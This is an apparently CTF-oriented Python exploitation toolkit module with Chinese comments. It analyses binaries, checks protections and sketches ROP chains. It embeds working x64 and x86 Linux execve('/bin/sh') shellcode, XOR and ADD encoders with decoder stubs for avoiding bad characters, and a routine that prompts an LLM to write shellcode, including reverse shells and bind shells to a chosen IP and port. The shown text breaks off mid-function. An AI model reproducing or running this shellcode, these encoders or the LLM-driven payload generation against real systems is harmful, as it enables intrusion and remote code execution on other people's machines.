# pwn/tools.py
"""
Pwn工具集

提供二进制分析、漏洞检测、利用构建等功能
"""

import re
import os
import subprocess
import struct
import json
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass
from enum import Enum


class ProtectionType(Enum):
    """二进制保护类型"""
    NX = "NX"           # Non-executable stack
    PIE = "PIE"         # Position Independent Executable
    CANARY = "Canary"   # Stack canary
    RELRO = "RELRO"     # Relocation Read-Only
    ASLR = "ASLR"       # Address Space Layout Randomization (system-level)


@dataclass
class BinaryInfo:
    """二进制文件信息"""
    path: str
    arch: str           # x86, x64, ARM, etc.
    bits: int           # 32, 64
    endian: str         # little, big
    protections: Dict[str, bool]
    functions: List[str]
    strings: List[str]
    gadgets: List[str]


@dataclass
class VulnerabilityInfo:
    """漏洞信息"""
    vuln_type: str      # buffer_overflow, format_string, uaf, etc.
    location: str       # 函数名或地址
    offset: int         # 偏移量
    severity: str       # high, medium, low
    exploit_method: str # 建议的利用方法


class BinaryAnalyzer:
    """
    二进制文件分析器

    分析ELF/PE文件，提取关键信息
    """

    # 常见危险函数
    DANGEROUS_FUNCTIONS = [
        'gets', 'strcpy', 'strcat', 'sprintf', 'vsprintf',
        'scanf', 'fscanf', 'sscanf', 'read', 'recv',
        'memcpy', 'memmove', 'printf', 'fprintf', 'sprintf'
    ]

    # 格式化字符串函数
    FORMAT_FUNCTIONS = ['printf', 'fprintf', 'sprintf', 'snprintf', 'vprintf']

    @classmethod
    def analyze(cls, binary_path: str) -> BinaryInfo:
        """
        分析二进制文件

        Args:
            binary_path: 二进制文件路径

        Returns:
            二进制文件信息
        """
        if not os.path.exists(binary_path):
            raise FileNotFoundError(f"Binary not found: {binary_path}")

        # 获取基本信息
        arch, bits, endian = cls._get_arch_info(binary_path)

        # 检测保护
        protections = ProtectionChecker.check(binary_path)

        # 提取函数
        functions = cls._extract_functions(binary_path)

        # 提取字符串
        strings = cls._extract_strings(binary_path)

        # 查找gadgets
        gadgets = cls._find_gadgets(binary_path)

        return BinaryInfo(
            path=binary_path,
            arch=arch,
            bits=bits,
            endian=endian,
            protections=protections,
            functions=functions,
            strings=strings,
            gadgets=gadgets
        )

    @classmethod
    def _get_arch_info(cls, binary_path: str) -> Tuple[str, int, str]:
        """获取架构信息"""
        try:
            # 使用file命令
            result = subprocess.run(
                ['file', binary_path],
                capture_output=True, text=True, timeout=10
            )
            output = result.stdout.lower()

            if 'x86-64' in output or 'x86_64' in output:
                return ('x64', 64, 'little')
            elif '80386' in output or 'i386' in output:
                return ('x86', 32, 'little')
            elif 'aarch64' in output or 'arm64' in output:
                return ('ARM64', 64, 'little')
            elif 'arm' in output:
                return ('ARM', 32, 'little')
            else:
                return ('unknown', 0, 'little')
        except Exception:
            return ('unknown', 0, 'little')

    @classmethod
    def _extract_functions(cls, binary_path: str) -> List[str]:
        """提取函数列表"""
        functions = []
        try:
            # 使用nm或readelf
            result = subprocess.run(
                ['nm', '-D', binary_path],
                capture_output=True, text=True, timeout=30
            )

            for line in result.stdout.split('\n'):
                parts = line.split()
                if len(parts) >= 3:
                    func_name = parts[-1]
                    if func_name and not func_name.startswith('_'):
                        functions.append(func_name)

            # 如果nm失败，尝试objdump
            if not functions:
                result = subprocess.run(
                    ['objdump', '-t', binary_path],
                    capture_output=True, text=True, timeout=30
                )
                for line in result.stdout.split('\n'):
                    if '.text' in line and 'F' in line:
                        parts = line.split()
                        if parts:
                            functions.append(parts[-1])
        except Exception:
            pass

        return list(set(functions))

    @classmethod
    def _extract_strings(cls, binary_path: str) -> List[str]:
        """提取字符串"""
        strings = []
        try:
            result = subprocess.run(
                ['strings', binary_path],
                capture_output=True, text=True, timeout=60
            )
            strings = [s.strip() for s in result.stdout.split('\n') if s.strip()]
        except Exception:
            pass

        return strings[:500]  # 限制数量

    @classmethod
    def _find_gadgets(cls, binary_path: str) -> List[str]:
        """查找ROP gadgets"""
        gadgets = []

        # 检查 ROPgadget 路径 (pipx 安装)
        ropgadget_path = None
        pipx_path = "/root/.local/bin/ROPgadget"
        if os.path.exists(pipx_path):
            ropgadget_path = pipx_path
        else:
            import shutil
            ropgadget_path = shutil.which("ROPgadget")

        if not ropgadget_path:
            return gadgets

        try:
            result = subprocess.run(
                [ropgadget_path, '--binary', binary_path, '--only', 'pop|ret'],
                capture_output=True, text=True, timeout=60
            )
            for line in result.stdout.split('\n'):
                if '0x' in line:
                    gadgets.append(line.strip())
        except FileNotFoundError:
            # ROPgadget未安装
            pass
        except Exception:
            pass

        return gadgets[:100]

    @classmethod
    def find_vulnerabilities(cls, binary_info: BinaryInfo) -> List[VulnerabilityInfo]:
        """
        查找潜在漏洞

        Args:
            binary_info: 二进制信息

        Returns:
            漏洞列表
        """
        vulns = []

        # 检查危险函数
        for func in binary_info.functions:
            if func in cls.DANGEROUS_FUNCTIONS:
                severity = 'high' if func in ['gets', 'strcpy'] else 'medium'
                vuln_type = 'format_string' if func in cls.FORMAT_FUNCTIONS else 'buffer_overflow'

                vulns.append(VulnerabilityInfo(
                    vuln_type=vuln_type,
                    location=func,
                    offset=0,
                    severity=severity,
                    exploit_method=cls._suggest_exploit(vuln_type, binary_info)
                ))

        # 检查字符串中的线索
        for s in binary_info.strings:
            if 'flag' in s.lower() or 'win' in s.lower():
                vulns.append(VulnerabilityInfo(
                    vuln_type='flag_hint',
                    location='string',
                    offset=0,
                    severity='low',
                    exploit_method='Check string location for flag'
                ))

        return vulns

    @classmethod
    def _suggest_exploit(cls, vuln_type: str, binary_info: BinaryInfo) -> str:
        """建议利用方法"""
        if vuln_type == 'buffer_overflow':
            if not binary_info.protections.get('NX', True):
                return 'Shellcode injection possible (NX disabled)'
            elif binary_info.gadgets:
                return 'ROP chain possible'
            else:
                return 'ret2libc may be required'

        elif vuln_type == 'format_string':
            return 'Format string exploitation (write primitives)'

        return 'Manual analysis required'


class ProtectionChecker:
    """
    保护机制检测器

    检测二进制的各种保护机制
    """

    @classmethod
    def check(cls, binary_path: str) -> Dict[str, bool]:
        """
        检测所有保护机制

        Args:
            binary_path: 二进制文件路径

        Returns:
            保护状态字典
        """
        protections = {
            'NX': True,      # 默认开启
            'PIE': False,
            'Canary': False,
            'RELRO': False,
            'Full_RELRO': False
        }

        try:
            # 使用checksec
            result = subprocess.run(
                ['checksec', '--file=' + binary_path],
                capture_output=True, text=True, timeout=30
            )
            output = result.stdout

            # 解析输出
            protections['NX'] = 'NX enabled' in output or 'NX: enabled' in output
            protections['PIE'] = 'PIE enabled' in output
            protections['Canary'] = 'Canary found' in output
            protections['RELRO'] = 'RELRO' in output
            protections['Full_RELRO'] = 'Full RELRO' in output

        except FileNotFoundError:
            # checksec未安装，使用readelf分析
            protections = cls._check_with_readelf(binary_path)
        except Exception:
            pass

        return protections

    @classmethod
    def _check_with_readelf(cls, binary_path: str) -> Dict[str, bool]:
        """使用readelf检测保护"""
        protections = {'NX': True, 'PIE': False, 'Canary': False, 'RELRO': False, 'Full_RELRO': False}

        try:
            # 检查NX
            result = subprocess.run(
                ['readelf', '-l', binary_path],
                capture_output=True, text=True, timeout=30
            )
            if 'GNU_STACK' in result.stdout and 'RWE' in result.stdout:
                protections['NX'] = False

            # 检查PIE
            result = subprocess.run(
                ['readelf', '-h', binary_path],
                capture_output=True, text=True, timeout=30
            )
            if 'DYN (Position-Independent Executable file)' in result.stdout:
                protections['PIE'] = True

            # 检查RELRO
            result = subprocess.run(
                ['readelf', '-l', binary_path],
                capture_output=True, text=True, timeout=30
            )
            if 'GNU_RELRO' in result.stdout:
                protections['RELRO'] = True
            # Full RELRO需要检查BIND_NOW

        except Exception:
            pass

        return protections

    @classmethod
    def check_aslr(cls) -> bool:
        """检查系统ASLR状态"""
        try:
            with open('/proc/sys/kernel/randomize_va_space', 'r') as f:
                return f.read().strip() != '0'
        except Exception:
            return True  # 默认假设开启


class ROPBuilder:
    """
    ROP链构建器

    自动构建ROP链
    """

    # 常用gadget模式
    COMMON_GADGETS = {
        'x64': {
            'pop_rdi': 'pop rdi; ret',
            'pop_rsi': 'pop rsi; ret',
            'pop_rdx': 'pop rdx; ret',
            'pop_rax': 'pop rax; ret',
            'syscall': 'syscall; ret',
            'ret': 'ret'
        },
        'x86': {
            'pop_eax': 'pop eax; ret',
            'pop_ebx': 'pop ebx; ret',
            'pop_ecx': 'pop ecx; ret',
            'pop_edx': 'pop edx; ret',
            'int_0x80': 'int 0x80'
        }
    }

    @classmethod
    def build_rop_chain(cls, binary_info: BinaryInfo,
                       target: str = 'execve',
                       arch: str = 'x64') -> Dict:
        """
        构建ROP链

        Args:
            binary_info: 二进制信息
            target: 目标函数 (execve, system, etc.)
            arch: 架构

        Returns:
            ROP链配置
        """
        gadgets = binary_info.gadgets

        # 查找需要的gadgets
        found_gadgets = cls._parse_gadgets(gadgets, arch)

        if target == 'execve':
            return cls._build_execve_chain(found_gadgets, arch)
        elif target == 'system':
            return cls._build_system_chain(found_gadgets, arch, binary_info)
        else:
            return {'status': 'unsupported', 'target': target}

    @classmethod
    def _parse_gadgets(cls, gadgets: List[str], arch: str) -> Dict[str, str]:
        """解析gadget列表"""
        found = {}

        for gadget_line in gadgets:
            if ':' in gadget_line:
                addr_part, gadget_part = gadget_line.split(':', 1)
                addr = addr_part.strip()
                gadget = gadget_part.strip()

                # 匹配常用gadget
                patterns = cls.COMMON_GADGETS.get(arch, {})
                for name, pattern in patterns.items():
                    if pattern.lower() in gadget.lower():
                        found[name] = addr
                        break

        return found

    @classmethod
    def _build_execve_chain(cls, gadgets: Dict, arch: str) -> Dict:
        """构建execve("/bin/sh")链"""
        if arch == 'x64':
            # 需要的gadgets: pop_rdi, pop_rsi, pop_rdx, pop_rax, syscall
            required = ['pop_rdi', 'pop_rax', 'syscall']
            missing = [g for g in required if g not in gadgets]

            if missing:
                return {
                    'status': 'incomplete',
                    'missing_gadgets': missing,
                    'found_gadgets': gadgets
                }

            return {
                'status': 'ready',
                'chain_steps': [
                    f"pop_rax ({gadgets['pop_rax']}) -> 0x3b (execve)",
                    f"pop_rdi ({gadgets['pop_rdi']}) -> address of '/bin/sh'",
                    "pop_rsi -> 0",
                    "pop_rdx -> 0",
                    f"syscall ({gadgets['syscall']})"
                ],
                'gadgets': gadgets,
                'note': 'Need to find /bin/sh string address in binary or use ret2libc'
            }

        return {'status': 'unsupported_arch', 'arch': arch}

    @classmethod
    def _build_system_chain(cls, gadgets: Dict, arch: str,
                           binary_info: BinaryInfo) -> Dict:
        """构建system("/bin/sh")链"""
        # 需要找到system函数地址和/bin/sh字符串
        strings = binary_info.strings

        binsh_addr = None
        for s in strings:
            if '/bin/sh' in s:
                # 需要计算实际地址
                binsh_addr = "need_address_calculation"
                break

        if arch == 'x64' and 'pop_rdi' in gadgets:
            return {
                'status': 'ready',
                'chain_steps': [
                    f"pop_rdi ({gadgets['pop_rdi']}) -> '/bin/sh' address",
                    "call system@PLT or system@GOT"
                ],
                'gadgets': gadgets,
                'note': 'Need to leak or calculate system address'
            }

        return {'status': 'needs_manual_work'}


class ShellcodeGenerator:
    """
    Shellcode生成器

    生成各种架构的shellcode，支持AI动态生成和验证
    """

    # 预定义shellcode模板（保留基本模板）
    SHELLCODES = {
        'x64_linux': {
            'execve_binsh': (
                b'\x48\x31\xf6'              # xor rsi, rsi
                b'\x56'                       # push rsi
                b'\x48\xbf\x2f\x62\x69\x6e'   # movabs rdi, '/bin//sh'
                b'\x2f\x2f\x73\x68'
                b'\x57'                       # push rdi
                b'\x54'                       # push rsp
                b'\x5f'                       # pop rdi
                b'\x48\x31\xd2'              # xor rdx, rdx
                b'\x48\xc7\xc0\x3b\x00\x00\x00'  # mov rax, 59
                b'\x0f\x05'                   # syscall
            ),
            'read_flag': None,  # 自定义
        },
        'x86_linux': {
            'execve_binsh': (
                b'\x31\xc0'                   # xor eax, eax
                b'\x50'                       # push eax
                b'\x68\x2f\x2f\x73\x68'       # push '//sh'
                b'\x68\x2f\x62\x69\x6e'       # push '/bin'
                b'\x89\xe3'                   # mov ebx, esp
                b'\x50'                       # push eax
                b'\x53'                       # push ebx
                b'\x89\xe1'                   # mov ecx, esp
                b'\x31\xd2'                   # xor edx, edx
                b'\xb0\x0b'                   # mov al, 11
                b'\xcd\x80'                   # int 0x80
            )
        },
        'arm_linux': {
            'execve_binsh': None,  # 需要AI生成
        }
    }

    # 禁止字符映射表（用于过滤）
    BAD_CHAR_ENCODINGS = {
        'null': b'\x00',
        'newline': b'\x0a\x0d',
        'space': b'\x20',
        'slash': b'\x2f',
        'backslash': b'\x5c',
        'quote': b'\x22\x27',
    }

    @classmethod
    def get_shellcode(cls, arch: str, os_type: str,
                     shellcode_type: str = 'execve_binsh') -> Optional[bytes]:
        """
        获取shellcode

        Args:
            arch: 架构 (x64, x86, arm)
            os_type: 操作系统 (linux)
            shellcode_type: shellcode类型

        Returns:
            shellcode字节
        """
        key = f"{arch}_{os_type}"
        if key in cls.SHELLCODES:
            return cls.SHELLCODES[key].get(shellcode_type)
        return None

    @classmethod
    def generate_custom(cls, requirements: Dict) -> Optional[bytes]:
        """
        根据需求生成自定义shellcode

        Args:
            requirements: 需求字典，包含目标操作等

        Returns:
            生成的shellcode或None
        """
        # 这里可以集成pwntools的shellcraft
        # 目前返回基本shellcode
        arch = requirements.get('arch', 'x64')
        action = requirements.get('action', 'shell')

        if action == 'shell':
            return cls.get_shellcode(arch, 'linux', 'execve_binsh')
        elif action == 'read_file':
            return cls._generate_read_file_shellcode(
                arch,
                requirements.get('filename', '/flag')
            )

        return None

    @classmethod
    def _generate_read_file_shellcode(cls, arch: str, filename: str) -> bytes:
        """生成读取文件的shellcode"""
        # 简化实现，实际应使用pwntools shellcraft
        if arch == 'x64':
            # 这里应生成读取文件的shellcode
            # 目前返回占位符
            return b'\x90' * 50  # NOP sled as placeholder
        return b''

    @classmethod
    def ai_generate_shellcode(cls,
                              arch: str = 'x64',
                              os_type: str = 'linux',
                              target_type: str = 'execve_binsh',
                              bad_chars: List[str] = None,
                              port: int = None,
                              ip: str = None,
                              filename: str = None,
                              custom_requirements: str = None) -> Dict:
        """
        AI动态生成shellcode

        Args:
            arch: 目标架构 (x64, x86, arm, arm64, mips)
            os_type: 操作系统 (linux, windows)
            target_type: shellcode类型
                - execve_binsh: 执行/bin/sh
                - reverse_shell: 反弹shell
                - read_file: 读取文件
                - write_file: 写入文件
                - bind_shell: 绑定shell端口
                - custom: 自定义功能
            bad_chars: 禁止字符列表 (如 ['\x00', '\x0a', '\x20'])
            port: 端口号 (用于reverse_shell/bind_shell)
            ip: 目标IP (用于reverse_shell)
            filename: 文件名 (用于read_file/write_file)
            custom_requirements: 自定义需求描述

        Returns:
            Dict: {
                'success': bool,
                'shellcode': bytes,  # 生成的shellcode
                'shellcode_hex': str,  # 十六进制字符串
                'length': int,
                'bad_chars_filtered': bool,  # 是否过滤了禁止字符
                'validation': Dict,  # 验证结果
                'explanation': str,  # AI解释
                'error': str  # 错误信息(如果失败)
            }
        """
        try:
            from llm_client import llm_client
            from config import config
        except ImportError:
            return {
                'success': False,
                'error': 'LLM client not available',
                'fallback': cls._fallback_generate(arch, os_type, target_type)
            }

        # 构建AI提示
        prompt = cls._build_shellcode_prompt(
            arch=arch,
            os_type=os_type,
            target_type=target_type,
            bad_chars=bad_chars,
            port=port,
            ip=ip,
            filename=filename,
            custom_requirements=custom_requirements
        )

        try:
            response = llm_client.call_chat_completion(
                model=config.ANALYST_MODEL,
                messages=[
                    {
                        "role": "system",
                        "content": """你是一个专业的shellcode生成专家。你需要生成正确、高效的机器码。
规则：
1. 只输出JSON格式
2. shellcode必须是可执行的机器码
3. 必须处理所有禁止字符
4. 提供详细的代码解释
5. 确保shellcode在目标架构上可运行"""
                    },
                    {
                        "role": "user",
                        "content": prompt
                    }
                ],
                temperature=0.1,
                json_mode=True,
                timeout=60
            )

            import json
            if "```json" in response:
                response = response.split("```json")[1].split("```")[0]

            result = json.loads(response.strip())

            # 解析并验证shellcode
            shellcode_hex = result.get('shellcode_hex', '')
            shellcode = bytes.fromhex(shellcode_hex) if shellcode_hex else None

            if shellcode:
                # 验证shellcode
                validation = cls.validate_shellcode(
                    shellcode=shellcode,
                    arch=arch,
                    bad_chars=bad_chars
                )

                # 检查禁止字符过滤
                bad_chars_filtered = validation.get('bad_chars_clean', False)

                # 如果有禁止字符，尝试编码
                if not bad_chars_filtered and bad_chars:
                    encoded_result = cls._encode_shellcode(shellcode, bad_chars, arch)
                    if encoded_result['success']:
                        shellcode = encoded_result['shellcode']
                        bad_chars_filtered = True
                        validation = cls.validate_shellcode(shellcode, arch, bad_chars)

                return {
                    'success': True,
                    'shellcode': shellcode,
                    'shellcode_hex': shellcode.hex(),
                    'length': len(shellcode),
                    'bad_chars_filtered': bad_chars_filtered,
                    'validation': validation,
                    'explanation': result.get('explanation', ''),
                    'registers_used': result.get('registers_used', []),
                    'syscalls': result.get('syscalls', [])
                }
            else:
                return {
                    'success': False,
                    'error': 'AI returned empty shellcode',
                    'fallback': cls._fallback_generate(arch, os_type, target_type)
                }

        except Exception as e:
            import logging
            logging.getLogger("Pwn").warning(f"[AI Shellcode] 生成失败: {e}")
            return {
                'success': False,
                'error': str(e),
                'fallback': cls._fallback_generate(arch, os_type, target_type)
            }

    @classmethod
    def _build_shellcode_prompt(cls,
                               arch: str,
                               os_type: str,
                               target_type: str,
                               bad_chars: List[str],
                               port: int,
                               ip: str,
                               filename: str,
                               custom_requirements: str) -> str:
        """构建AI生成提示"""
        arch_info = {
            'x64': {'bits': 64, 'registers': ['rax', 'rdi', 'rsi', 'rdx', 'rcx', 'r8', 'r9'], 'syscall_reg': 'rax'},
            'x86': {'bits': 32, 'registers': ['eax', 'ebx', 'ecx', 'edx'], 'syscall_reg': 'eax'},
            'arm': {'bits': 32, 'registers': ['r0', 'r1', 'r2', 'r3', 'r4'], 'syscall_reg': 'r7'},
            'arm64': {'bits': 64, 'registers': ['x0', 'x1', 'x2', 'x3', 'x8'], 'syscall_reg': 'x8'},
            'mips': {'bits': 32, 'registers': ['v0', 'a0', 'a1', 'a2', 'a3'], 'syscall_reg': 'v0'}
        }

        target_descriptions = {
            'execve_binsh': '执行 /bin/sh 获取shell',
            'reverse_shell': f'连接到 {ip}:{port} 反弹shell',
            'bind_shell': f'绑定shell到端口 {port}',
            'read_file': f'读取文件 {filename} 并输出到stdout',
            'write_file': f'写入文件 {filename}',
            'custom': custom_requirements or '自定义功能'
        }

        syscall_tables = {
            'x64_linux': {'execve': 59, 'read': 0, 'write': 1, 'open': 2, 'socket': 41, 'connect': 42, 'dup2': 33},
            'x86_linux': {'execve': 11, 'read': 3, 'write': 4, 'open': 5, 'socket': 102, 'connect': 102, 'dup2': 63}
        }

        prompt = f"""
生成shellcode机器码。

## 目标环境
- 架构: {arch} ({arch_info.get(arch, {}).get('bits', 64)}位)
- 操作系统: {os_type}
- 可用寄存器: {arch_info.get(arch, {}).get('registers', [])}

## 目标功能
{target_descriptions.get(target_type, target_type)}

## 系统调用号参考 (如果需要)
{json.dumps(syscall_tables.get(f'{arch}_{os_type}', {}), indent=2)}

## 禁止字符 (必须避免)
{json.dumps(bad_chars, indent=2) if bad_chars else '无特殊限制'}

## 参数
- 端口: {port if port else 'N/A'}
- IP: {ip if ip else 'N/A'}
- 文件名: {filename if filename else 'N/A'}

## 输出格式 (JSON)
{{
    "shellcode_hex": "生成的shellcode十六进制字符串（纯机器码，不要空格）",
    "length": shellcode字节数,
    "explanation": "逐行解释shellcode的功能",
    "registers_used": ["使用的寄存器列表"],
    "syscalls": ["使用的系统调用列表"],
    "bad_chars_handled": true/false,
    "encoding_method": "使用的编码方法(如有)"
}}
"""
        return prompt

    @classmethod
    def _fallback_generate(cls, arch: str, os_type: str, target_type: str) -> Dict:
        """AI生成失败时的降级方案"""
        shellcode = cls.get_shellcode(arch, os_type, target_type)
        if shellcode:
            return {
                'success': True,
                'shellcode': shellcode,
                'shellcode_hex': shellcode.hex(),
                'length': len(shellcode),
                'source': 'fallback_template',
                'note': '使用预定义模板，可能包含禁止字符'
            }
        return {
            'success': False,
            'error': f'No template available for {arch}_{os_type}_{target_type}'
        }

    @classmethod
    def validate_shellcode(cls,
                          shellcode: bytes,
                          arch: str = 'x64',
                          bad_chars: List[str] = None) -> Dict:
        """
        验证shellcode有效性

        Args:
            shellcode: shellcode字节
            arch: 目标架构
            bad_chars: 禁止字符列表

        Returns:
            Dict: {
                'valid': bool,
                'length': int,
                'bad_chars_found': List[str],  # 发现的禁止字符
                'bad_chars_clean': bool,  # 是否无禁止字符
                'warnings': List[str],  # 警告信息
                'arch_check': Dict  # 架构检查结果
            }
        """
        result = {
            'valid': True,
            'length': len(shellcode),
            'bad_chars_found': [],
            'bad_chars_clean': True,
            'warnings': [],
            'arch_check': {}
        }

        # 检查shellcode长度
        if len(shellcode) == 0:
            result['valid'] = False
            result['warnings'].append('Shellcode is empty')
            return result

        # 检查禁止字符
        if bad_chars:
            for char in bad_chars:
                if isinstance(char, str):
                    char_bytes = char.encode('latin-1')
                else:
                    char_bytes = bytes([char]) if isinstance(char, int) else char

                if char_bytes in shellcode:
                    result['bad_chars_found'].append(char)
                    result['bad_chars_clean'] = False

        # 架构特定检查
        if arch in ['x64', 'x86']:
            result['arch_check'] = cls._validate_x86_shellcode(shellcode, arch)
        elif arch in ['arm', 'arm64']:
            result['arch_check'] = cls._validate_arm_shellcode(shellcode, arch)

        # 常见问题检查
        if b'\x00' in shellcode:
            result['warnings'].append('Contains null bytes (may cause issues in string operations)')

        # 检查可能的无效指令模式
        invalid_patterns = [
            b'\xff\xff\xff\xff',  # 全FF可能是填充
            b'\xcc\xcc\xcc\xcc',  # int3断点
        ]
        for pattern in invalid_patterns:
            if pattern in shellcode:
                result['warnings'].append(f'Contains potentially problematic pattern: {pattern.hex()}')

        return result

    @classmethod
    def _validate_x86_shellcode(cls, shellcode: bytes, arch: str) -> Dict:
        """验证x86/x64 shellcode"""
        check = {
            'arch': arch,
            'syscall_instructions': [],
            'potential_syscalls': 0
        }

        # 查找syscall指令
        if arch == 'x64':
            syscall_pattern = b'\x0f\x05'  # syscall
            int80_pattern = b'\xcd\x80'    # int 0x80 (32-bit compat)
        else:
            syscall_pattern = b'\x0f\x05'
            int80_pattern = b'\xcd\x80'    # int 0x80

        idx = 0
        while idx < len(shellcode):
            pos = shellcode.find(syscall_pattern, idx)
            if pos != -1:
                check['syscall_instructions'].append(f'syscall at offset {pos}')
                check['potential_syscalls'] += 1
                idx = pos + 2
            else:
                break

        idx = 0
        while idx < len(shellcode):
            pos = shellcode.find(int80_pattern, idx)
            if pos != -1:
                check['syscall_instructions'].append(f'int 0x80 at offset {pos}')
                check['potential_syscalls'] += 1
                idx = pos + 2
            else:
                break

        return check

    @classmethod
    def _validate_arm_shellcode(cls, shellcode: bytes, arch: str) -> Dict:
        """验证ARM shellcode"""
        check = {
            'arch': arch,
            'svc_instructions': [],
            'potential_syscalls': 0
        }

        # 查找svc (supervisor call) 指令
        # ARM: svc #0 = \x00\x00\x00\xef (little endian)
        # ARM64: svc #0 = \x01\x00\x00\xd4
        if arch == 'arm':
            svc_pattern = b'\x00\x00\x00\xef'
        else:  # arm64
            svc_pattern = b'\x01\x00\x00\xd4'

        idx = 0
        while idx < len(shellcode):
            pos = shellcode.find(svc_pattern, idx)
            if pos != -1:
                check['svc_instructions'].append(f'svc #0 at offset {pos}')
                check['potential_syscalls'] += 1
                idx = pos + 4
            else:
                break

        return check

    @classmethod
    def _encode_shellcode(cls, shellcode: bytes, bad_chars: List[str], arch: str) -> Dict:
        """
        对shellcode进行编码以避免禁止字符

        支持多种编码方法:
        - XOR编码
        - ADD编码
        - 字母数字编码
        """
        result = {
            'success': False,
            'shellcode': None,
            'decoder_stub': None,
            'method': None
        }

        if not bad_chars:
            return result

        # 转换禁止字符为字节集合
        bad_bytes = set()
        for char in bad_chars:
            if isinstance(char, str):
                bad_bytes.update(char.encode('latin-1'))
            elif isinstance(char, int):
                bad_bytes.add(char)
            else:
                bad_bytes.update(char)

        # 尝试XOR编码
        xor_result = cls._xor_encode(shellcode, bad_bytes, arch)
        if xor_result['success']:
            return xor_result

        # 尝试ADD编码
        add_result = cls._add_encode(shellcode, bad_bytes, arch)
        if add_result['success']:
            return add_result

        return result

    @classmethod
    def _xor_encode(cls, shellcode: bytes, bad_bytes: set, arch: str) -> Dict:
        """XOR编码"""
        # 寻找可用的XOR密钥
        for key in range(1, 256):
            if key in bad_bytes:
                continue

            # 检查编码后是否有禁止字符
            encoded = bytes(b ^ key for b in shellcode)
            has_bad = any(b in bad_bytes for b in encoded)

            if not has_bad:
                # 构建decoder stub
                if arch == 'x64':
                    decoder = cls._build_xor_decoder_x64(key, len(shellcode))
                elif arch == 'x86':
                    decoder = cls._build_xor_decoder_x86(key, len(shellcode))
                else:
                    continue

                # 检查decoder是否包含禁止字符
                if not any(b in bad_bytes for b in decoder):
                    return {
                        'success': True,
                        'shellcode': decoder + encoded,
                        'decoder_stub': decoder.hex(),
                        'method': 'xor',
                        'key': key
                    }

        return {'success': False}

    @classmethod
    def _add_encode(cls, shellcode: bytes, bad_bytes: set, arch: str) -> Dict:
        """ADD编码"""
        # 寻找可用的ADD偏移
        for offset in range(1, 128):
            # 检查编码后是否有禁止字符
            encoded = bytes((b + offset) % 256 for b in shellcode)
            has_bad = any(b in bad_bytes for b in encoded)

            if not has_bad:
                # 构建decoder stub
                if arch == 'x64':
                    decoder = cls._build_add_decoder_x64(offset, len(shellcode))
                elif arch == 'x86':
                    decoder = cls._build_add_decoder_x86(offset, len(shellcode))
                else:
                    continue

                if not any(b in bad_bytes for b in decoder):
                    return {
                        'success': True,
                        'shellcode': decoder + encoded,
                        'decoder_stub': decoder.hex(),
                        'method': 'add',
                        'offset': offset
                    }

        return {'success': False}

    @classmethod
    def _build_xor_decoder_x64(cls, key: int, length: int) -> bytes:
        """构建x64 XOR decoder stub"""
        # 简化的decoder stub
        # 注意：这是一个基础实现，实际使用时可能需要调整
        stub = b''
        stub += b'\xeb\x10'             # jmp short get_data
        # decoder:
        stub += b'\x5e'                 # pop rsi (data address)
        stub += b'\x31\xc9'             # xor ecx, ecx
        stub += b'\x66\x81\xc1'         # add cx,
        stub += length.to_bytes(2, 'little')  # length
        stub += b'\x80\x36' + bytes([key])    # xor byte [rsi], key
        stub += b'\x48\xff\xc6'         # inc rsi
        stub += b'\xe2\xf9'             # loop xor_loop
        stub += b'\xeb\x05'             # jmp shellcode
        # get_data:
        stub += b'\xe8\xeb\xff\xff\xff' # call decoder

        return stub

    @classmethod
    def _build_xor_decoder_x86(cls, key: int, length: int) -> bytes:
        """构建x86 XOR decoder stub"""
        stub = b''
        stub += b'\xeb\x0e'             # jmp short get_data
        # decoder:
        stub += b'\x5e'                 # pop esi
        stub += b'\x31\xc9'             # xor ecx, ecx
        stub += b'\x66\x81\xc1'         # add cx,
        stub += length.to_bytes(2, 'little')  # length
        stub += b'\x80\x36' + bytes([key])    # xor byte [esi], key
        stub += b'\x46'                 # inc esi
        stub += b'\xe2\xf9'             # loop xor_loop
        stub += b'\xeb\x05'             # jmp shellcode
        # get_data:
        stub += b'\xe8\xed\xff\xff\xff' # call decoder

        return stub

    @classmethod
    def _build_add_decoder_x64(cls, offset: int, length: int) -> bytes:
        """构建x64 ADD decoder stub"""
        stub = b''
        stub += b'\xeb\x10'             # jmp short get_data
        # decoder:
        stub += b'\x5e'                 # pop rsi
        stub += b'\x31\xc9'             # xor ecx, ecx
        stub += b'\x66\x81\xc1'         # add cx,
        stub += length.to_bytes(2, 'little')  # length
        stub += b'\x80\x2e' + bytes([offset]) # sub byte [rsi], offset
        stub += b'\x48\xff\xc6'         # inc rsi
        stub += b'\xe2\xf9'             # loop sub_loop
        stub += b'\xeb\x05'             # jmp shellcode
        # get_data:
        stub += b'\xe8\xeb\xff\xff\xff' # call decoder

        return stub

    @classmethod
    def _build_add_decoder_x86(cls, offset: int, length: int) -> bytes:
        """构建x86 ADD decoder stub"""
        stub = b''
        stub += b'\xeb\x0e'             # jmp short get_data
        # decoder:
        stub += b'\x5e'                 # pop esi
        stub += b'\x31\xc9'             # xor ecx, ecx
        stub += b'\x66\x81\xc1'         # add cx,
        stub += length.to_bytes(2, 'little')  # length
        stub += b'\x80\x2e' + bytes([offset]) # sub byte [esi], offset
        stub += b'\x46'                 # inc esi
        stub += b'\xe2\xf9'             # loop sub_loop
        stub += b'\xeb\x05'             # jmp shellcode
        # get_data:
        stub += b'\xe8\xed\xff\xff\xff' # call decoder

        return stub

    @classmethod
    def generate_with_encoder(cls,
                              target_type: str = 'execve_binsh',
                              arch: str = 'x64',
                              bad_chars: List[str] = None,
                              encoder: str = 'auto') -> Dict:
        """
        生成带编码器的shellcode

        Args:
            target_type: shellcode类型
            arch: 架构
            bad_chars: 禁止字符
            encoder: 编码器类型 ('auto', 'xor', 'alpha', 'unicode')

        Returns:
            Dict包含生成的shellcode和编码信息
        """
        # 首先获取基础shellcode
        base_shellcode = cls.get_shellcode(arch, 'linux', target_type)

        if not base_shellcode:
            # 尝试AI生成
            ai_result = cls.ai_generate_shellcode(
                arch=arch,
                os_type='linux',
                target_type=target_type,
                bad_chars=bad_chars
            )
            if ai_result.get('success'):
                return ai_result
            return {
                'success': False,
                'error': f'Cannot generate shellcode for {target_type} on {arch}'
            }

        # 检查是否需要编码
        if bad_chars:
            bad_bytes = set()
            for char in bad_chars:
                if isinstance(char, str):
                    bad_bytes.update(char.encode('latin-1'))
                elif isinstance(char, int):
                    bad_bytes.add(char)
                else:
                    bad_bytes.update(char)

            has_bad_chars = any(b in bad_bytes for b in base_shellcode)

            if has_bad_chars:
                # 尝试编码
                if encoder == 'auto':
                    # 自动选择编码器
